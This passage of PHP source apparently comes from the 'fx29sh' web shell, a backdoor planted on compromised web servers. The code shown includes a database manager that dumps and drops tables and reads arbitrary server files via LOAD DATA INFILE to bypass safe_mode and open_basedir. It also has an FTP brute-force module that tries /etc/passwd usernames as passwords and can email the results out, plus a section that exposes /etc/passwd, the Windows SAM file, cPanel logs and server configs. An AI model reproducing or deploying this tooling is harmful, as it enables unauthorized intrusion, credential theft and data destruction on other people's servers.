          foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}

          if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}

          $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";

          $sql_act = "query";

          $sql_tbl_act = "browse";

        }

        elseif ($sql_tbl_insert_radio == 2) {

          $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);

          $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";

          $result = mysql_query($sql_query) or print(mysql_smarterror());

          $result = mysql_fetch_array($result, MYSQL_ASSOC);

          $sql_act = "query";

          $sql_tbl_act = "browse";

        }

      }

      if ($sql_act == "query") {

        echo "<hr size=\"1\" noshade>";

        if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}

        if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}

        if ((!$submit) or ($sql_act)) { echo "<table><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>"; }

      }

      if (in_array($sql_act,$acts)) {

        ?>

    <table>

        <tr>

        <td>

        <b>Create new table:</b>

        <form action="<?php echo $surl; ?>">

            <input type="hidden" name="act" value="sql">

            <input type="hidden" name="sql_act" value="newtbl">

            <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">

            <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">

            <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">

            <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">

            <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">

            <input type="text" name="sql_newtbl" size="20">

            Fields: <input type="text" name="sql_field" size="3">

            <input type="submit" value="Create">

        </form>

        </td>

        <td><b>Dump DB:</b>

        <form action="<?php echo $surl; ?>">

            <input type="hidden" name="act" value="sql">

            <input type="hidden" name="sql_act" value="dump">

            <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">

            <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">

            <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">

            <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">

            <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">

            <input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">

            <input type="submit" name="submit" value="Dump">

        </form>

        </td>

        </tr>

    </table>

<?php

        if (!empty($sql_act)) { echo "<hr size=\"1\" noshade>"; }

        if ($sql_act == "newtbl") {

          echo "<b>";

          if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {

            echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";

          }

          else { echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror(); }

        }

        elseif ($sql_act == "dump") {

          if (empty($submit)) {

            $diplay = FALSE;

            echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";

            echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";

            $v = join (";",$dmptbls);

            echo "<b>Only tables (explode \";\") <b><sup>1</sup></b>:</b> <input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";

            if ($dump_file) {$tmp = $dump_file;}

            else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}

            echo "<b>File:</b> <input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";

            echo "<b>Download: </b> <input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";

            echo "<b>Save to file: </b> <input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";

            echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";

            echo "</form>";

          }

          else {

            $diplay = TRUE;

            $set = array();

            $set["sock"] = $sql_sock;

            $set["db"] = $sql_db;

            $dump_out = "download";

            $set["print"] = 0;

            $set["nl2br"] = 0;

            $set[""] = 0;

            $set["file"] = $dump_file;

            $set["add_drop"] = TRUE;

            $set["onlytabs"] = array();

            if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}

            $ret = mysql_dump($set);

            if ($sql_dump_download) {

              @ob_clean();

              header("Content-type: application/octet-stream");

              header("Content-length: ".strlen($ret));

              header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");

              echo $ret;

              exit;

            }

            elseif ($sql_dump_savetofile) {

              $fp = fopen($sql_dump_file,"w");

              if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}

              else {

                fwrite($fp,$ret);

                fclose($fp);

                echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";

              }

            }

            else {echo "<b>Dump: nothing to do!</b>";}

          }

        }

        if ($diplay) {

          if (!empty($sql_tbl)) {

              if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}

              $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");

              $count_row = mysql_fetch_array($count);

              mysql_free_result($count);

              $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");

                $tbl_struct_fields = array();

                while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}

              if (@$sql_ls > @$sql_le) { $sql_le = $sql_ls + $perpage; }

              if (empty($sql_tbl_page)) { $sql_tbl_page = 0; }

              if (empty($sql_tbl_ls)) { $sql_tbl_ls = 0; }

              if (empty($sql_tbl_le)) { $sql_tbl_le = 30; }

              $perpage = $sql_tbl_le - $sql_tbl_ls;

              if (!is_numeric($perpage)) { $perpage = 10; }

              $numpages = $count_row[0]/$perpage;

              $e = explode(" ",$sql_order);

              if (count($e) == 2) {

                if ($e[0] == "d") { $asc_desc = "DESC"; }

                else { $asc_desc = "ASC"; }

                $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";

              }

              else {$v = "";}

              $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";

              $result = mysql_query($query) or print(mysql_smarterror());

              echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";

              echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[<b> Structure </b>]</a> &nbsp; ";

              echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[<b> Browse </b>]</a> &nbsp; ";

              echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[<b> Dump </b>]</a> &nbsp; ";

              echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a> &nbsp; ";

              if ($sql_tbl_act == "structure") { echo "<b>Under construction!</b>"; }

              if ($sql_tbl_act == "insert") {

                if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}

                if (!empty($sql_tbl_insert_radio)) { echo "<b>Under construction!</b>"; }

                else {

                  echo "<br><br><b>Inserting row into table:</b><br>";

                  if (!empty($sql_tbl_insert_q)) {

                    $sql_query = "SELECT * FROM `".$sql_tbl."`";

                    $sql_query .= " WHERE".$sql_tbl_insert_q;

                    $sql_query .= " LIMIT 1;";

                    $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());

                    $values = mysql_fetch_assoc($result);

                    mysql_free_result($result);

                  }

                  else {$values = array();}

                  echo "<form method=\"POST\"><table width=\"1%\"><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";

                  foreach ($tbl_struct_fields as $field) {

                    $name = $field["Field"];

                    if (empty($sql_tbl_insert_q)) {$v = "";}

                    echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";

                    $i++;

                  }

                  echo "</table><br>";

                  echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";

                  if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}

                  echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";

                }

              }

              if ($sql_tbl_act == "browse") {

                $sql_tbl_ls = abs($sql_tbl_ls);

                $sql_tbl_le = abs($sql_tbl_le);

                echo "<hr size=\"1\" noshade>";

                echo "<img src=\"".$surl."act=img&img=multipage\" alt=\"Pages\"> ";

                $b = 0;

                for($i=0;$i<$numpages;$i++) {

                  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}

                  echo $i;

                  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}

                  if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}

                  else { echo " "; }

                }

                if ($i == 0) {echo "empty";}

                echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b> <input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"> <b>To:</b> <input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"> <input type=\"submit\" value=\"View\"></form>";

                echo "<br><form method=\"POST\">\n";

                echo "<table><tr>";

                echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";

                for ($i=0;$i<mysql_num_fields($result);$i++) {

                  $v = mysql_field_name($result,$i);

                  if ($e[0] == "a") {$s = "d"; $m = "asc";}

                  else {$s = "a"; $m = "desc";}

                  echo "<td>";

                  if (empty($e[0])) {$e[0] = "a";}

                  if (@$e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}

                  else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" alt=\"".$m."\"></a>";}

                  echo "</td>";

                }

                echo "<td><font color=\"green\"><b>Action</b></font></td>";

                echo "</tr>";

                while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {

                  echo "<tr>";

                  $w = "";

                  $i = 0;

                  foreach ($row as $k=>$v) {

                    $name = mysql_field_name($result,$i);

                    $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;

                  }

                  if (count($row) > 0) { $w = substr($w,0,strlen($w)-3); }

                  echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";

                  $i = 0;

                  foreach ($row as $k=>$v) {

                    $v = htmlspecialchars($v);

                    if ($v == "") { $v = "<font color=\"green\">NULL</font>"; }

                    echo "<td>".$v."</td>";

                    $i++;

                  }

                  echo "<td>";

                  echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\">Delete</a> ";

                  echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\">Edit</a> ";

                  echo "</td>";

                  echo "</tr>";

               }

               mysql_free_result($result);

               echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" alt=\" ^ \"><select name=\"sql_act\">";

               echo "<option value=\"\">With selected:</option>";

               echo "<option value=\"deleterow\">Delete</option>";

               echo "</select> <input type=\"submit\" value=\"Confirm\"></form></p>";

            }

         }

         else {

           $result = mysql_query("SHOW TABLE STATUS", $sql_sock);

           if (!$result) { echo mysql_smarterror(); }

           else {

?>

    <form method="POST">

    <table>

        <tr><th><input type="checkbox" name="boxtbl_all" value="1"></th><th>Table</th><th>Rows</th><th>Engine</th><th>Created</th><th>Modified</th><th>Size</th><th>Action</th></tr>

<?php

             $i = 0;

             $tsize = $trows = 0;

             while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {

               $tsize += $row["Data_length"];

               $trows += $row["Rows"];

               $size = view_size($row["Data_length"]);

?>

        <tr>

            <td><input type="checkbox" name="boxtbl[]" value="<?php echo $row["Name"]; ?>"></td>

            <td><a href="<?php echo $sql_surl; ?>sql_tbl=<?php echo urlencode($row["Name"]); ?>"><b><?php echo $row["Name"]; ?></b></a></td>

            <td><?php echo $row["Rows"]; ?></td><td><?php echo $row["Engine"]; ?></td><td><?php echo $row["Create_time"]; ?></td><td><?php echo $row["Update_time"]; ?></td><td><?php echo $size; ?></td>

            <td><a href="<?php echo $sql_surl; ?>sql_act=query&sql_query=<?php echo urlencode("DELETE FROM `".$row["Name"]."`"); ?>">Empty</a>&nbsp;<a href="<?php echo $sql_surl; ?>sql_act=query&sql_query=<?php echo urlencode("DROP TABLE `".$row["Name"]."`"); ?>">Drop</a>&nbsp;<a href="<?php echo $sql_surl; ?>sql_tbl_act=insert&sql_tbl=<?php echo $row["Name"]; ?>">Insert</a></td>

        </tr>

<?php

               $i++;

             }

             echo "\t\t<tr>\n".

                   "\t\t<th>+</th><th>$i table(s)</th><th>$trows</th><th>$row[1]</th><th>$row[10]</th><th>$row[11]</th><th>".view_size($tsize)."</th><th></th>\n";

?>

        </tr>

    </table>

    <div align="right">

    <select name="sql_act">

        <option value="">With selected:</option>

        <option value="tbldrop">Drop</option>

        <option value="tblempty">Empty</option>";

        <option value="tbldump">Dump</option>";

        <option value="tblcheck">Check table</option>";

        <option value="tbloptimize">Optimize table</option>";

        <option value="tblrepair">Repair table</option>";

        <option value="tblanalyze">Analyze table</option>";

    </select>

    <input type="submit" value="Confirm">

    </div>

    </form>

<?php

             mysql_free_result($result);

           }

         }

       }

     }

   }

   else {

        $acts = array("","newdb","serverstatus","servervars","processes","getfile");

        if (in_array($sql_act,$acts)) {

?>

    <table>

        <tr>

        <td><b>Create new DB:</b>

        <form action="<?php echo $surl; ?>">

            <input type="hidden" name="act" value="sql">

            <input type="hidden" name="sql_act" value="newdb">

            <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">

            <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">

            <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">

            <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">

            <input type="text" name="sql_newdb" size="20">

            <input type="submit" value="Create">

        </form>

        </td>

        <td><b>View File:</b>

        <form action="<?php echo $surl; ?>">

            <input type="hidden" name="act" value="sql">

            <input type="hidden" name="sql_act" value="getfile">

            <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">

            <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">

            <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">

            <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">

            <input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">

            <input type="submit" value="Get">

        </form>

        </td>

        </tr>

    </table>

<?php

       }



       ##[ SQL ACTIONS ]##

       if (!empty($sql_act)) {

         echo "<hr size=\"1\" noshade>";

         if ($sql_act == "newdb") {

           echo "<b>";

           if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}

           else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}

         }

         if ($sql_act == "serverstatus") {

           $result = mysql_query("SHOW STATUS", $sql_sock);

           echo "<center><b>Server-status variables:</b><br><br>";

           echo "<table><td><b>Name</b></td><td><b>Value</b></td></tr>";

           while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}

           echo "</table></center>";

           mysql_free_result($result);

         }

         if ($sql_act == "servervars") {

           $result = mysql_query("SHOW VARIABLES", $sql_sock);

           echo "<center><b>Server variables:</b><br><br>";

           echo "<table><td><b>Name</b></td><td><b>Value</b></td></tr>";

           while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}

           echo "</table>";

           mysql_free_result($result);

         }

         if ($sql_act == "processes") {

           if (!empty($kill)) {

             $query = "KILL ".$kill.";";

             $result = mysql_query($query, $sql_sock);

             echo "<b>Process #".$kill." was killed.</b>";

           }

           $result = mysql_query("SHOW PROCESSLIST", $sql_sock);

           echo "<center><b>Processes:</b><br><br>";

           echo "<table><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";

           while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}

           echo "</table>";

           mysql_free_result($result);

         }

         if ($sql_act == "getfile") {

           $tmpdb = $sql_login."_tmpdb";

           $select = mysql_select_db($tmpdb);

           if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}

           if ($select) {

             $created = FALSE;

             mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");

             mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");

             $result = mysql_query("SELECT * FROM tmp_file;");

             if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}

             else {

               for ($i=0;$i<mysql_num_fields($result);$i++) { $name = mysql_field_name($result,$i); }

               $f = "";

               while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) { $f .= join ("\r\n",$row); }

               if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}

               else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}

               mysql_free_result($result);

               mysql_query("DROP TABLE tmp_file;");

             }

           }

           mysql_drop_db($tmpdb);

         }

       }

     }

    }

?>

    </td>

    </tr>

<?php

    if ($sql_sock) {

      $affected = @mysql_affected_rows($sql_sock);

      if ((!is_numeric($affected)) or ($affected < 0)) { $affected = 0; }

      echo "\t<tr><th colspan=2>Affected rows: $affected</th></tr>";

    }

?>



</table>

<!-- End of SQL Manager -->



<?php

  }

  if ($act == "ftpquickbrute") {

    echo "<table>\n";

    echo "<tr><td class=\"barheader\" colspan=2>.: Ftp Quick Brute :.</td></tr>";

    echo "<tr><td>";

    if (!empty($submit)) {

      if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}

      $fp = fopen("/etc/passwd","r");

      if (!$fp) {echo "Can't get /etc/passwd for password-list.";}

      else {

        if ($fqb_logging) {

          if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}

          else {$fqb_logfp = FALSE;}

          $fqb_log = "FTP Quick Brute (".sh_name().") started at ".date("d.m.Y H:i:s")."\r\n\r\n";

          if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}

        }

        @ob_flush();

        $i = $success = 0;

        $ftpquick_st = getmicrotime();

        while(!feof($fp)) {

          $str = explode(":",fgets($fp,2048));

          if (fx29ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh)) {

            echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";

            $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";

            if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}

            $success++;

            ob_flush();

          }

          if ($i > $fqb_lenght) {break;}

          $i++;

        }

        if ($success == 0) { echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n"; }

        $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);

        echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font class=on><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";

        $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";

        if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}

        if ($fqb_logemail) {@mail($fqb_logemail,"".sh_name()." report",$fqb_log);}

        fclose($fqb_logfp);

      }

    }

    else {

      $logfile = $tmp_dir."fx29sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";

      $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);

      echo "<form name=\"f_ftpqb\" action=\"".$surl."\">\n".

             "<input type=hidden name=act value=\"ftpquickbrute\">\n".

           "Read first:</td><td><input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"></td></tr>".

           "<tr><td></td><td><input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"> Users only with shell</td></tr>".

           "<tr><td></td><td><input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked>Logging</td></tr>".

           "<tr><td>Logging to file:</td><td><input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"></td></tr>".

           "<tr><td>Logging to e-mail:</td><td><input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"></td></tr>".

           "<tr><td colspan=2><input type=submit name=submit value=\"Brute\"></form>";

    }

    echo "</td></tr></table></center>";

  }

  ##[ SECURITY ]##

  if ($act == "security") {

?>

<div class=barheader>.: Server Security Information :.</div>



<table class="contents">

    <tr><td>Open Base Dir</td><td><?php echo $hopenbasedir; ?></td></tr>

    <td>Password File</td><td>

<?php

    if (!is_windows()) {

      if ($nixpasswd) {

        if ($nixpasswd == 1) { $nixpasswd = 0; }

        if (!is_numeric($nixpwd_s)) { $nixpwd_s = 0; }

        if (!is_numeric($nixpwd_e)) { $nixpwd_e = $nixpwdperpage; }

?>

    *nix /etc/passwd:<br>

    <form name="f_pwd" action="<?php echo $surl; ?>">

        <input type="hidden" name="act" value="security">

        <input type="hidden" name="nixpasswd" value="1">

        <b>From:</b>

        <input type="text" name="nixpwd_s" value="<?php echo $nixpwd_s; ?>">

        <b>To:</b>

        <input type="text" name="nixpwd_e" value="<?php $nixpwd_e; ?>">

        <input type="submit" value="View">

    </form><br>

<?php

        $i = $nixpwd_s;

        while ($i < $nixpwd_e) {

          $uid = posix_getpwuid($i);

          if ($uid) {

            $uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";

            echo "\t\t".join(":",$uid)."<br>\n";

          }

          $i++;

        }

      }

      else { echo "\t<a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b>View /etc/passwd</b></a>\n"; }

    }

    else {

      $v = $_SERVER["WINDIR"].'\repair\sam';

      if (file_get_contents($v)) {

        echo "\t<a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><b>Download password file</b></a>\n";

      }

    }

?>

    </td></tr>

    <tr><td>Config Files</td><td>

<?php

    if (!is_windows()) {

      $v = array(

          array("User Domains","/etc/userdomains"),

          array("Cpanel Config","/var/cpanel/accounting.log"),

          array("Apache Config","/usr/local/apache/conf/httpd.conf"),

          array("Apache Config","/etc/httpd.conf"),

          array("Syslog Config","/etc/syslog.conf"),

          array("Message of The Day","/etc/motd"),

          array("Hosts","/etc/hosts")

      );

      $sep = "/";

    }

    else {

      $windir = $_SERVER["WINDIR"];

      $etcdir = $windir.'\system32\drivers\etc\\';

      $v = array(

          array("Hosts",$etcdir."hosts"),

          array("Local Network Map",$etcdir."networks"),

          array("LM Hosts",$etcdir."lmhosts.sam"),

      );

      $sep = "\\";

    }

    foreach ($v as $sec_arr) {

      $sec_f = substr(strrchr($sec_arr[1], $sep), 1);

      $sec_d = rtrim($sec_arr[1],$sec_f);

      $sec_full = $sec_d.$sec_f;

      $sec_d = rtrim($sec_d,$sep);

      if (file_get_contents($sec_full)) {

        echo "\t[ <a href=\"".$surl."act=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"><b>".$sec_arr[0]."</b></a> ]\n";

      }

    }

?>

    </td></tr>

<?php

    function dispsecinfo($name,$value) {

      if (!empty($value)) {

        echo "\t<tr><td>".$name."</td><td>\n".

            "<pre>".wordwrap($value,100)."</pre>\n".

            "\t</td></tr>\n";

      }

    }



    if (!is_windows()) {

      dispsecinfo("OS Version",fx29exec("cat /proc/version"));

      dispsecinfo("Kernel Version",fx29exec("sysctl -a | grep version"));

      dispsecinfo("Distrib Name",fx29exec("cat /etc/issue.net"));

